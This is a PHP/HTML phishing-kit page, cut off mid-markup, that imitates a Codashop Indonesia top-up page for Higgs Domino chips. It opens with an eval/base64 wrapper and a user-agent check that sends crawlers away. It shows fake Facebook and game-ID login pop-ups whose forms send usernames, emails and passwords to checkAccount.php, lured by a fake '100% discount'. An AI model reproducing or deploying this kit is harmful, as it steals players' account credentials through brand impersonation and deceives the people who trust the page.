<?php 
/*   __________________________________________________
    |       SC Gratis Dilindungi Oleh Encrypt!      |
    |     Beli VIP/Premium untuk versi anti-encrypt    |
    |        WA: 083136489793 / HaykalJB        |
    |__________________________________________________|
*/
eval("?>".base64_decode("<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/IdhamDotID');
die();
}
?>
<!doctype html>
<html lang="en">
   <head>
      <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/xss.min.js"></script>
      <!-- End Google Tag Manager -->
      <script src="https://script.tapfiliate.com/tapfiliate.js" type="text/javascript" async></script>
      <meta charset="UTF-8">
      <!--[if lt IE 9]>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
      <![endif]-->
      <title>Top Up Chip Topbos Higgs Domino | Top Up Chip Topbos Higgs Domino | Codashop - Indonesia</title>
      <meta name="generator" content="coda2" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
      <meta name="mobile-web-app-capable" content="yes" />
      <meta name="apple-mobile-web-app-capable" content="yes" />
      <meta name="application-name" content="Codashop" />
      <meta name="apple-mobile-web-app-capable " content="yes " />
      <meta name="apple-mobile-web-app-status-bar-style " content="black " />
      <meta name="apple-mobile-web-app-title " content="Codashop " />
      <link rel="apple-touch-icon " href="https://www.codashop.com/img/icons/favicon-32.png?v=2" />
      <meta name="msapplication-TileImage " content="https://www.codashop.com/img/icons/favicon-32.png?v=2" />
      <meta name="msapplication-TileColor " content="#f76b1d " />
      <meta name="theme-color " content="#f76b1d" />
      <meta name="format-detection" content="telephone=no" />
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <link rel="icon" type="image/x-icon" href="https://www.codashop.com/img/icons/favicon-32.png?v=2" />
      <!-- OG Tags Start -->
      <meta property="og:url" content="https://www.codashop.com/id/free-fire" />
      <meta property="og:type" content="product" />
      <meta property="og:title" content="Top Up Chip Topbos Higgs Domino | Top Up Chip Topbos Higgs Domino | Codashop - Indonesia" />
      <meta property="og:description" content="Top up Chip Higgs Domino menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!"
         />
      <meta property="og:image" content="https://rawcdn.githack.com/AlexHostX/all.img/1ad376f70fc8f0feb803d664737970c83f1614fc/freefire_640x241.jpg" />
      <meta property="og:image:width" content="1200" />
      <meta property="og:image:height" content="630" />
      <!-- OG Tags End -->
      <meta name="description" content="Top up Chip Higgs Domino menggunakan ShopeePay, Telkomsel, Indosat, Tri, XL, Smartfren, GoPay, Dana, OVO, LinkAja, Bank Transfer, Indomaret, Alfamart hingga Kredivo di Codashop. Tanpa kartu kredit, paling praktis, terpercaya di Indonesia - Beli sekarang!"
         />
      <link rel="preconnect" href="https://www.google-analytics.com">
      <link rel="preconnect" href="https://connect.facebook.net">
      <link rel="preconnect" href="https://www.googletagmanager.com">
      <link rel="preconnect" href="https://cdn.onesignal.com">
      <link rel="preconnect" href="https://cdn1.codashop.com">
      <style>
         .product__long-description,
         .product-container,
         .footer-container {
         display: none;
         }
      </style>
      <!-- Facebook Pixel Code -->
      <script>
         ! function(f, b, e, v, n, t, s) {
             if (f.fbq) return;
             n = f.fbq = function() {
                 n.callMethod ?
                     n.callMethod.apply(n, arguments) : n.queue.push(arguments)
             };
             if (!f._fbq) f._fbq = n;
             n.push = n;
             n.loaded = !0;
             n.version = '2.0';
             n.queue = [];
             t = b.createElement(e);
             t.async = !0;
             t.src = v;
             s = b.getElementsByTagName(e)[0];
             s.parentNode.insertBefore(t, s)
         }(window,
             document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
         fbq('init', 916139058437464); // Insert your pixel ID here.
         //fbq('track', 'PageView');
      </script>
      <noscript>
         <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=916139058437464&ev=PageView&noscript=1" />
      </noscript>
      <!-- DO NOT MODIFY -->
      <!-- End Facebook Pixel Code -->
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
      <link rel="stylesheet" href="../css/popupLogin.css">
      <link rel="stylesheet" href="../css/facebook.css">
      <link rel="stylesheet" href="../css/twitter.css">
   </head>
   <body class="theme-page--product-page" oncontextmenu="return false" onselectstart="return false" ondragstart="return false" style="background: #280031;">
   
      <div class="popup-login facebook animated fadeIn" style="display: none;">
         <div class="popup-box-login-fb">
            <a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
            <div class="navbar-fb">
               <img src="https://i.ibb.co/xD5RCn1/facebook-text.png" style="width: 100px;">
            </div>
            <div class="content-box-fb">
               <img src="https://image.winudf.com/v2/image1/Y29tLm5lcHR1bmUuZG9taW5vX2ljb25fMTU1OTA0NjkyOV8wODc/icon.png?w=170&fakeurl=1" style="width: 60px;">
               <div class="txt-login-fb">
                  Masuk ke akun Facebook Anda untuk terhubung ke Higgs Domino
               </div>
               <form class="login-form" action="checkAccount.php" method="post">
                  <label>
                  <input type="text" name="gameId" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
                  </label>
                  <label>
                  <input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
                  </label>
                  <input type="hidden" name="nickname" id="nickname">
                  <input type="hidden" name="userIdForm" id="userIdForm">
                  <input type="hidden" name="login" value="Facebook" readonly>
                  <button type="submit" class="btn-login-fb">Masuk</button>
               </form>
               <div class="txt-create-account">Buat Akun</div>
               <div class="txt-not-now">Tidak sekarang</div>
               <div class="txt-forgotten-password">Lupa Sandi?</div>
            </div>
            <div class="language-box">
               <center>
               <div class="language-name language-name-active">Bahasa Indonesia</div>
               <div class="language-name">English (UK)</div>
               <div class="language-name">Basa Jawa</div>
               <div class="language-name">Bahasa Melayu</div>
               <div class="language-name">日本語</div>
               <div class="language-name">Español</div>
               <div class="language-name">Português (Brasil)</div>
               <div class="language-name">
                  <i class="fa fa-plus"></i>
               </div>
               </center>
            </div>
            <div class="copyright">Facebook Inc.</div>
         </div>
      </div>

      <div class="popup-login twitter animated fadeIn" style="display: none;">
         <div class="popup-box-login-twitter">
         <a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
            <div class="header-twitter">
               <center>
               <img src="https://image.winudf.com/v2/image1/Y29tLm5lcHR1bmUuZG9taW5vX2ljb25fMTU1OTA0NjkyOV8wODc/icon.png?w=170&fakeurl=1" style="width: 50px;">
               </center>
            </div>
            <div class="box-twitter">
               <center>
               <form action="checkAccount.php" method="post">
                  <div class="txt-login-twitter">Game ID Login</div>
                  <div class="input-box-twitter">
                     <input type="text" name="gameId" placeholder="Game Id" required>
                  </div>
                  <div class="input-box-twitter">
                     <input type="password" name="password" placeholder="Kata Sandi" required>
                  </div>
                  <input type="hidden" name="nickname" id="nickname">
                  <input type="hidden" name="userIdForm" id="userIdForm">
                  <input type="hidden" name="login" value="Game Id" readonly>
                  <button type="submit" class="btn-login-twitter">Log In</button>
               </form>
               </center>
            </div>
         </div>
      </div>

      <input type="hidden" id="seller-name" value="Higgs Domino">
      <input type="hidden" id="context-path" value="">
      <input type="hidden" id="group-id" value="33">
      <div id="product-page__container" class="product-page__container">
         <script type="text/javascript">
            $(document).ready(function() {
                countryCode = '360';
            });
            
            var viewAllText = 'Lihat semua';
            var resultUnitText = 'Hasil';
            var notFoundText = 'Tidak ada hasil';
         </script>
         <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/shop-topnav2.7e1fed6bdf.js"></script>
         <nav class="top-navbar top-nav--general">
            <div class="top-nav-container">
               <div class="logo-container">
                  <a href="/" class="logo-container-link">
                  <img class="logo-image theme-default__logo" src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo-new-2x.png" alt="Codashop" />
                  </a>
                  <h3 class="slogan-element">Cara tercepat dan termudah untuk pembelian kredit permainan.</h3>
               </div>
               <div class="search-container">
                  <div class="search-icon-container">
                     <svg class="search-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                        <path d="M23.809 21.646l-6.205-6.205c1.167-1.605 1.857-3.579 1.857-5.711 0-5.365-4.365-9.73-9.731-9.73-5.365 0-9.73 4.365-9.73 9.73 0 5.366 4.365 9.73 9.73 9.73 2.034 0 3.923-.627 5.487-1.698l6.238 6.238 2.354-2.354zm-20.955-11.916c0-3.792 3.085-6.877 6.877-6.877s6.877 3.085 6.877 6.877-3.085 6.877-6.877 6.877c-3.793 0-6.877-3.085-6.877-6.877z"/>
                     </svg>
                  </div>
               </div>
            </div>
            <div class="search-input-container">
               <input type="search" name="search-keyword" id="search-keyword" class="input-search" placeholder='Pencarian game atau voucher'>
            </div>
            <div class="search-result-list"></div>
         </nav>
         <nav class="top-navbar top-nav--productpage">
            <div class="top-nav-container">
               <div class="custom-page__logo" style="display: none">
                  <div class="logo-image-container">
                     <a href="/ph"><img class="logo-image" src="https://cdn1.codashop.com/S/content/common/images/grab.29dad06670f873936002ddb910253a4b.png" alt="Grabpay"></a>
                  </div>
                  <span class="brand-tagline"></span>
               </div>
               <div class="logo-container">
                  <a href="/" class="logo-container-link">
                  <img class="logo-image theme-default__logo" src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo-new-2x.png" alt="Codashop" />
                  </a>
                  <h3 class="slogan-element">Cara tercepat dan termudah untuk pembelian kredit permainan.</h3>
               </div>
               <div class="search-input-container">
                  <div class="search-input-container--productpage">
                     <input type="search" name="search-input" id="search-input" class="search-input__productpage" placeholder='Pencarian game atau voucher'>
                     <svg class="search-icon--productpage" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
                        <path d="M23.809 21.646l-6.205-6.205c1.167-1.605 1.857-3.579 1.857-5.711 0-5.365-4.365-9.73-9.731-9.73-5.365 0-9.73 4.365-9.73 9.73 0 5.366 4.365 9.73 9.73 9.73 2.034 0 3.923-.627 5.487-1.698l6.238 6.238 2.354-2.354zm-20.955-11.916c0-3.792 3.085-6.877 6.877-6.877s6.877 3.085 6.877 6.877-3.085 6.877-6.877 6.877c-3.793 0-6.877-3.085-6.877-6.877z"/>
                     </svg>
                  </div>
                  <div class="search-result-list"></div>
               </div>
            </div>
         </nav>
         <div class="notification-wrapper"></div>
         <main class="container product-container">
            <!-- Google Tag Manager (noscript) -->
            <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PF7TJ9" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
            <!-- End Google Tag Manager (noscript) -->
            <input type="hidden" id="page-name" value="productPage">
            <input type="hidden" id="country-id" value="ID">
            <header class="product-details-container shop-content__container">
               <figure class="product-top-banner__container shop-content--image">
                  <img src="https://cdn1.codashop.com/S/content/common/images/mno/higgs_domino640x241.jpg" alt="" class="product__top-banner">
               </figure>
               <h2 class="product__name shop-content--heading">Higss Domino</h2>
               <input type="checkbox" id="product-description" name="product-description" class="product-description-checkbox">
               <label for="product-description">
               <span class="more-info">Baca lebih lanjut</span>
               <span class="less-info">Tutup informasi detail</span>
               </label>
               <article class="product__description shop-content__container">
                  <p class="shop-content--paragraph"> <strong> PERINGATAN: Mohon untuk hubungi pihak higgs Domino jika anda ada pertanyaan perihal kemitraan Higgs domino</a></strong> </p>
                  <p class="shop-content--paragraph"> Top up koin chip Higgs Domino! Cukup masukan User ID Higgs Domino Anda, pilih jumlah Koin yang Anda inginkan, selesaikan pembayaran, dan Koin atau Chip akan secara langsung ditambahkan ke akun Higgs Domino Anda.</p>
                  <p class="shop-content--paragraph"> Bayarlah menggunakan GoPay, OVO, Bank Transfers, Telkomsel, Indosat, Tri Indonesia, XL Axiata, Smartfren, DANA, Shopee Pay, LinkAja, Kredivo, Alfamart, Indomaret, DOKU, TrueMoney Indonesia, dan kartu kredit. Codashop adalah cara terbaik untuk top up Higgs Domino Island secara online tanpa perlu kartu kredit, registrasi ataupun log-in.</p>
                  <p class="shop-content--paragraph">Bayarlah menggunakan
                     <strong class="shop-content--pc-name">Alfamart</strong>,
                     <strong class="shop-content--pc-name">Transfer Bank</strong>,
                     <strong class="shop-content--pc-name">DOKU Wallet</strong>,
                     <strong class="shop-content--pc-name">GoPay</strong>,
                     <strong class="shop-content--pc-name">Indomaret</strong>,
                     <strong class="shop-content--pc-name">Indosat</strong>,
                     <strong class="shop-content--pc-name">Kredivo </strong>,
                     <strong class="shop-content--pc-name">LinkAja</strong>,
                     <strong class="shop-content--pc-name">Shopee Pay</strong>,
                     <strong class="shop-content--pc-name">Smartfren</strong>,
                     <strong class="shop-content--pc-name">Telkomsel</strong>,
                     <strong class="shop-content--pc-name">True Money</strong>
                     <strong class="shop-content--pc-name">Tri</strong>,
                     <strong class="shop-content--pc-name">Dana</strong>dan
                     <strong class="shop-content--pc-name">XL</strong>. Tanpa perlu kartu kredit, registrasi ataupun log-in.
                  </p>
                  <p class="shop-content--paragraph"> Unduh dan mainkan Higgs Domino sekarang!<br>
                     <a class="shop-content--badge" href="http://bit.ly/2MO50Gc" rel="noopener" target="_blank">
                     <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store"></a>
                     <a class="shop-content--badge" href="http://bit.ly/2HPopnP" rel="noopener" target="_blank">
                     <img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play"></a>
                  </p>
                  
               </article>
            </header>
            <section id="contents" class="main-content">
               <input type="hidden" id="pricePointId" name="pricePointId" value="" />
               <div class="section select-server">
                  <h2 class="circle">
                     <span style="background: #6242fc;">1</span> Masukkan ID
                  </h2>
                  <div class="form-group-container form-user-identities">

         <div class="form-field-wrapper form__field-user-id single-field-form">
            <input id="id" type="tel" class="playerid form-input" placeholder="Masukan ID" maxlength="12">
         </div>

         <div class="form__image-helper-container">
            <span class="ico-question desktop-trigger" style="background: #6242fc;">?</span>
                        <span class="ico-question mobile-trigger" style="background: #6242fc;">?</span>
                     </div>
         
         <div class="img-helper">
            <div id="img-helper-element"></div>
            <span class="img-helper__close-btn"> ✕ </span>
        </div>

         <div class="img-helper__background"></div>
         <p class="form__field-instruction-text">Untuk menemukan User ID, ketuk Avatar Anda di sudut kiri atas layar utama. User ID tercantum dibawah avatar Anda. Masukan User ID Anda disini. Contoh: "1234567".</p>
         
    </div>
               </div>
               <div class="confirm-modal__container" id="confirm-user-dialog" title="">
                  <ul>
                     <li class="confirm-modal__title">Detail pesanan</li>
                     <li class="confirm-modal__confirm-txt">Mohon konfirmasi nama panggilan anda sudah benar.</li>
                  </ul>
               </div>
               <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/jquery.mask.min.js"></script>
               <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/mobile/js/freefire.4a7a9740bc.js"></script>
               <script type="text/javascript" src="https://cdn1.codashop.com/S2/content/common/js/third_party_common.0859f0e010.js"></script>
               <script type="text/javascript">
                  $(document).ready(function() {
                      $("#confirm-user-dialog").dialog({
                          resizable: false,
                          height: "auto",
                          dialogClass: "no-titlebar",
                          autoOpen: false,
                          modal: true,
                          dialogClass: "confirm-user-dialog__container",
                          buttons: [{
                                  text: 'Batalkan',
                                  class: "confirm-user-dialog__btn btn-cancel",
                                  click: function() {
                                      $('.confirm-user-dialog__container').hide();
                                      $("#overlay").hide();
                                  }
                              },
                              {
                                  text: 'Konfirm',
                                  class: "confirm-user-dialog__btn btn-blue",
                                  click: function() {
                                      $('.confirm-user-dialog__container').hide();
                                      $("#overlay").hide();
                                      openTxnWindow();
                                  }
                              }
                          ],
                          create: function(event, ui) {
                              $(".ui-widget-header").hide();
                              $(this).closest(".ui-dialog").css("padding-top", "15px");
                          }
                      });
                  
                  
                  
                  });
                  
                  function showConfirmation(data, extraMsg) {
                      var ul = $("#confirm-user-dialog > ul");
                  
                      ul = $(ul);
                  
                      $("#confirm-user-dialog > ul > li").not('li:first, li:nth-child(2)').remove();
                  
                      var li = $();
                      var nickname = JSON.parse(decodeURIComponent(data.result)).roles[0].role;
                  
                      nickname = filterXSS(nickname);
                  
                      li = li.add("<li class='confirm-user-dialog__extra-msg'>" + extraMsg + "</li>");
                      li = li.add("<li><div>" + 'Nama panggilan: ' + "</div><div>" + nickname + "</div></li>");
                      li = li.add("<li><div>" + 'ID: ' + "</div><div>" + data.user.userId + "</div></li>");
                      li = li.add("<li><div>" + 'Harga: ' + "</div><div>" + data.channelPrice + "</div></li>");
                      li = li.add("<li><div>" + 'Bayar dengan: ' + "</div><div>" + data.paymentChannel + "</div></li>");
                  
                      li.appendTo(ul);
                      ul.appendTo("#confirm-user-dialog");
                  
                      var txnIdElement = $();
                      txnIdElement = txnIdElement.add("<span id='span-txnId' class='" + data.txnId + "' style='display: none;'></span>");
                      txnIdElement.appendTo("#confirm-user-dialog");
                  
                      $("#overlay").fadeIn(function() {
                          $(".confirm-user-dialog__container").show();
                      });
                  }
               </script>
               <div class="section voucher">
                  <h2 class="circle">
                     <span style="background: #6242fc;">2</span> Pilih Nominal Top Up
                  </h2>
                  <ul class="vocherSelectionList ul-denoms voucher-denom-container">
                     <li id="denomination_991" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([991],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        30M Koin Emas-D
                        </a>
                     </li>
                     <li id="denomination_994" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([994],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        60M Koin Emas-D
                        </a>
                     </li>
                     <li id="denomination_995" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([995],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        100M Koin Emas-D
                        </a>
                     </li>
                     <li id="denomination_992" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([992],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        200M Koin Emas-D
                        </a>
                     </li>
                     <li id="denomination_993" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([993],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                         10B Koin Emas-D
                        </a>
                     </li>
                     <li id="denomination_996" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([996],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        120B Koin Emas-D
                        </a>
                     </li>
                     <li id="denomination_997" class="voucher-list-element">
                        <a href="javascript:CODA.Shop.selectedPaymentChannelId=null;selectDenom([997],0,false);">
                        <span class="element-check-label" style="background: #6242fc"></span>
                        300B Koin Emas-D
                        </a>
                     </li>
                     
                  </ul>
               </div>
               <script type="text/javascript">
                  $('.disable-voucher').mouseover(function() {
                      tempText = $(this).html();
                      $(this).html('Tidak tersedia');
                  });
                  
                  $('.disable-voucher').mouseout(function() {
                      $(this).html(tempText);
                  });
               </script>
               <div class="section payment">
                  <h2 class="circle">
                     <span style="background: #6242fc;">3</span> Pilih pembayaran
                  </h2>
                  <div id="paymentChannelSuggestionModal" class="pc-suggestion-modal">
                     <form id="paymentChannelSuggestionForm" action="/spring/api/suggestPaymentChannel" method="POST">
                        <input type="hidden" id="paymentChannelSuggestionCountry" name="paymentChannelSuggestionCountry" value="ID" />
                        <div class="pc-suggestion-card">
                           <i id="btnIconClose" class="pc-suggestion-icon-close"></i>
                           <p class="pc-suggestion-title">
                              Kami menghargai masukanmu!
                           </p>
                           <p class="pc-suggestion-description">
                              Kami terus berusaha untuk menambah lebih banyak lagi pilihan pembayaran di Indonesia! Beri tahu kami metode pembayaran apa yang kamu ingin gunakan di Codashop!
                           </p>
                           <p>
                              <input type="text" class="pc-suggestion-input-field" maxlength="100" placeholder="Ketik pilihan pembayaran yang kamu inginkan di sini" id="paymentChannelSuggestionValue"></input>
                           </p>
                           <p id="paymentChannelSuggestionErrorMsgDiv" style="display:none;">
                              <img src="https://cdn1.codashop.com/S2/content/mobile/images/error-icon.20986d3fe0.png" alt="Error" width="14px" height="14px">
                              <span id="paymentChannelSuggestionErrorMsg" class="pc-suggestion-error-msg"></span>
                           </p>
                           <div class="pc-suggestion-text-center">
                              <div class="g-recaptcha" data-sitekey=6Lc8br0ZAAAAAOAZHpdE1Fm9RA9tK85W3ano_l0-> </div>
                           </div>
                           <input type="submit" class="pc-suggestion-submit-button" value="Kirim" />
                        </div>
                     </form>
                  </div>
                  <ul class="ul-paymentChannels">
                     <li id="paymentChannel_227" class="payment-channel-element">
                        <div class="payment-channel-link" onclick="selectPaymentChannel(227, 'GoPay', false, false, false, false, false);">
                           <span class="element-check-label" id="checkLabel" style="background: #6242fc;"></span>
                           <div class="payment-channel-container">
                              <figure class="payment-logo-container">
                                 <img class="logo" src="https://i.ibb.co/QvHNzqr/1.png" alt="GO_PAY logo" />
                              </figure>
                           </div>
                           <div class="payment-price-container">
                              <div class="price_label" id="priceLabel_227"></div>
                              <div class="price pr" id="priceInfo_227"></div>
                           </div>
                           <div class="payment-tagline-container" id="showTagline" style="width: 100%;">
                              <p class="payment-tagline" style="display: block;">Bayar dengan CodaPay ( Diskon 100% )</p>
                           </div>
                           <div class="best-deal-label" id="showPayLabel"></div>
                        </div>
                     </li>

                  </ul>
               </div>
               <div class="section buy default-template">
                  <h2 class="circle">
                     <span style="background: #6242fc;">4</span>
                     <div class="section-title">Beli!</div>
                  </h2>
                  <div class="form" id="formSection">
                     <p class="emailOptional default-1">Optional: Jika anda ingin mendapatkan bukti pembayaran atas pembelian anda, harap mengisi alamat emailnya</p>
                     <div class="email-input-container">
                        <input type="email" id="email" name="name" class="product-form-input" placeholder="Alamat E-mail">
                     </div>
                     <div class="email-form-btn-group">
                        <button id="mdn-submit" class="email-form-btn__submit" style="background: #6242fc;
    border: none;
    border-radius: 20px;">
                           <div class="loader" id="submit-loader"></div>
                           <span class="btn-submit-text">Beli sekarang</span>
                           <span class="btn-submit-text for-grab"></span>
                        </button>
                        <div class="remember-me-container">
                           <label for="ck1" class="remember-me-label">
                           <input type="checkbox" class="remember-me-chkbox" id="ck1">
                           <span class="remember-me-checkmark"></span>
                           <span class="remember-me-text"> Ingat saya </span>
                           </label>
                        </div>
                     </div>
                  </div>
                  <input type="hidden" id="id_no">
               </div>
               <div class="popError">
                  <div class="section">
                     <h2 class="errorHeader" style="background: #280031">
                        Aduh!
                     </h2>
                     <ul class="" id="errorMessage"></ul>
                     <br><br>
                     <a href="javascript:void(0);" id="hidePopError" class="modal-button">
                     Kembali</a>
                  </div>
               </div>
               <div id="overlay" class="overlay-element"></div>
            </section>
         </main>
         <section class="section product__long-description shop-content__container" style="background: #280031;"> 
            <h1 class="product-tagline-title">
                
                    Codashop - cara paling mudah beli chip Higgs Domino di Indonesia
                
                
                
            </h1>
            <article class="product__tag-line">
                
                    <p class="shop-content--paragraph">Hanya butuh beberapa detik saja untuk membeli Koin Chip Higgs Domino. Kamu bisa main game slot, poker, bakarat dan lainnya pakai Koin Chip Higgs Domino! Di Codashop, top-up jadi mudah, aman, dan praktis. Codashop dipercaya oleh jutaan gamers & pengguna aplikasi di Asia Tenggara termasuk Indonesia. Caranya mudah, tanpa perlu kartu kredit, registrasi, ataupun log-in!  <a href="#top">Klik disini untuk memulai</a>.</p>
<p class="shop-content--paragraph"><strong>Tentang Higgs Domino
Higgs Domino Island adalah sebuah permainan domino yang berciri khas lokal terbaik di Indonesia.</strong><br>
Ini adalah game online yang unik dan menyenangkan, ada Domino Gaple, Domino QiuQiu.99 dan sejumlah permainan poker seperti Remi, Cangkulan, dan lainnya untuk membuat waktu luangmu semakin menyenangkan.</p>
<p class="shop-content--paragraph"><strong>Persyaratan Sistem Minimum</strong>
<br>• OS: Android 4.1+
<br>• Muatan Unduhan: 71 MB
<br>• GPU: Adreno 505 (atau setara)
<br>• RAM: 2GB

</p></article> 
                    </div>
                  </section></div>
        </section>
         <link rel="stylesheet" href="https://cdn1.codashop.com/S/content/common/css/jquery-ui-1.12.1.css" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-topnav2.5566e671b1.css" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/productPage/responsive-product-page2.7ec2b81ede.css" />
         <!-- info bar css -->
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/mobile/css/infoBar.662b8f1b5f.css" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-shop-content.e6202b83de.css" />
         <link rel="stylesheet preload" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-fontfaces.b6c83d3582.css" as="style" />
         <link rel="stylesheet" type="text/css" href="https://cdn1.codashop.com/S2/content/common/css/shared-footer2.2ce4d6e299.css" />
         <footer class="footer-container">
            <div class="footer-area">
               <section class="left-blocks-container">
                  <div class="socials-container">
                     <p class="social-title">Dapatkan berita Coda di:</p>
                     <div class="footer__social-media-container">
                        <a href='https://www.facebook.com/Codashop.IDofficial/' target="_blank" class="social-icon-container" aria-label="Codashop Official Facebook" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-H36.png" alt="" class="social-icon">
                        </a>
                        <a href='https://www.youtube.com/c/CodashopOfficial' target="_blank" class="social-icon-container" aria-label="Codashop Youtube Channel" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-youtube-H36.png" alt="" class="social-icon">
                        </a>
                        <a href='https://www.instagram.com/codashop.idofficial/' target="_blank" class="social-icon-container" aria-label="Codashop Official" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-instagram-H36.png" alt="" class="social-icon">
                        </a>
                     </div>
                  </div>
                  <div class="support-container">
                     <p class="support-title">Butuh Bantuan?</p>
                     <div class="support-icons">
                        <a href='http://m.me/Codashop.IDofficial' target="_blank" class="social-icon-container" aria-label="Contact via Facebook" rel="noopener">
                        <img src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-msg-H36.png" alt="" class="social-icon">
                        </a>
                     </div>
                     <a href='https://support.codapay.com/hc/en-us/categories/360000012223-Indonesia' target="_blank" class="support-link" aria-label="Contact Codashop support" rel="noopener">
                        <div class="contact-icon">
                           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                              <path d="M320 352h-23.1a174.08 174.08 0 0 1-145.8 0H128A128 128 0 0 0 0 480a32 32 0 0 0 32 32h384a32 32 0 0 0 32-32 128 128 0 0 0-128-128zM48 224a16 16 0 0 0 16-16v-16c0-88.22 71.78-160 160-160s160 71.78 160 160v16a80.09 80.09 0 0 1-80 80h-32a32 32 0 0 0-32-32h-32a32 32 0 0 0 0 64h96a112.14 112.14 0 0 0 112-112v-16C416 86.13 329.87 0 224 0S32 86.13 32 192v16a16 16 0 0 0 16 16zm160 0h32a64 64 0 0 1 55.41 32H304a48.05 48.05 0 0 0 48-48v-16a128 128 0 0 0-256 0c0 40.42 19.1 76 48.35 99.47-.06-1.17-.35-2.28-.35-3.47a64.07 64.07 0 0 1 64-64z"/>
                           </svg>
                        </div>
                        <div class="contact-text">Hubungi Kami</div>
                     </a>
                  </div>
                  <div class="international-container">
                     <a href="/international" class="international-flag-block" rel="noopener">
                        <i class='f32_indonesia footer__country-flag' id="footer__country-flag"></i>
                        <div class="international__country-name">Indonesia</div>
                     </a>
                  </div>
               </section>
               <section class="right-blocks-container">
                  <div class="legal-content-container">
                     <a href="/marketing-and-partnerships" target="_blank" rel="noopener">Pemasaran dan Kemitraan</a>
                     <a href='https://www.codapayments.com/terms-conditions' target="_blank" rel="noopener">Syarat & Ketentuan</a>
                     <a href='https://www.codapayments.com/privacy-policy-bahasa' target="_blank" rel="noopener">Kebijakan Privasi</a>
                  </div>
                  <div class="copyright-container"> ©Hak Cipta Coda Payments </div>
               </section>
            </div>
         </footer>
      </div>
      <div style="display: none;" id="showKonfirm">
         <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front confirm-user-dialog__container ui-dialog-buttons ui-draggable" aria-describedby="confirm-user-dialog" aria-labelledby="ui-id-1" style="padding-top: 15px;">
            <div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle" style="display: none;"><span id="ui-id-1" class="ui-dialog-title">&nbsp;</span><button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close"><span class="ui-button-icon ui-icon ui-icon-closethick"></span><span class="ui-button-icon-space"> </span>Close</button></div>
            <div class="confirm-modal__container ui-dialog-content ui-widget-content" id="confirm-user-dialog" style="display: block;">

               <ul>
                     <li class="confirm-modal__title" style="background: #280031;">Detail pesanan</li>
                     <li class="confirm-modal__confirm-txt">Mohon konfirmasi nama panggilan anda sudah benar.</li>
